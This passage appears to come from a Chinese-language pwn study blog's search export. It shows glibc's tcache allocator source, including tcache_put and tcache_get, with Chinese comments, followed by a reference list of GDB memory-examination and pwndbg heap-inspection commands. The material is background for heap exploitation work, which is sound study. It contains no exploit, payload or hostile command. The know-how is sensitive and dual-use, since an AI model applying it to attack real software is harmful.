class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//tcache单链表的链表头</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];      <span class="hljs-comment">//各个链表头构成的指针数组</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);          <span class="hljs-comment">//单链表未满7</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];    <br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);         <span class="hljs-comment">//在范围内</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);      <span class="hljs-comment">//对应大小的单链表不为空</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="pwndbg堆查看指令"><a href="#pwndbg堆查看指令" class="headerlink" title="pwndbg堆查看指令"></a>pwndbg堆查看指令</h2><h5 id="1-查看内存指令x："><a href="#1-查看内存指令x：" class="headerlink" title="1.查看内存指令x："></a>1.查看内存指令x：</h5><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，nfu代表三个参数</p><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面<br>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p><p>x &#x2F;10xd $rdi &#x2F;&#x2F;从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p><h5 id="2-堆操作指令（pwndbg插件独有）"><a href="#2-堆操作指令（pwndbg插件独有）" class="headerlink" title="2.堆操作指令（pwndbg插件独有）"></a>2.堆操作指令（pwndbg插件独有）</h5><p>arena &#x2F;&#x2F;显示arena的详细信息<br>arenas &#x2F;&#x2F;显示所有arena的基本信息<br>arenainfo &#x2F;&#x2F;好看的显示所有arena的信息<br>bins &#x2F;&#x2F;常用，查看所有种类的堆块的链表情况<br>fastbins &#x2F;&#x2F;单独查看fastbins的链表情况<br>largebins &#x2F;&#x2F;同上，单独查看largebins的链表情况<br>smallbins &#x2F;&#x2F;同上，单独查看smallbins的链表情况<br>unsortedbin &#x2F;&#x2F;同上，单独查看unsortedbin链表情况<br>tcachebins &#x2F;&#x2F;同上，单独查看tcachebins的链表情况<br>tcache &#x2F;&#x2F;查看tcache详细信息<br>heap &#x2F;&#x2F;数据结构的形式显示所有堆块，会显示一大堆<br>heapbase &#x2F;&#x2F;查看堆起始地址<br>heapinfo、heapinfoall &#x2F;&#x2F;显示堆得信息，和bins的挺像的，没bins好用<br><strong>parseheap &#x2F;&#x2F;显示堆结构，很好用（不包括堆区域外通过uaf申请的内存）</strong><br>tracemalloc &#x2F;&#x2F;好用，会跟提示所有操作堆的地方</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
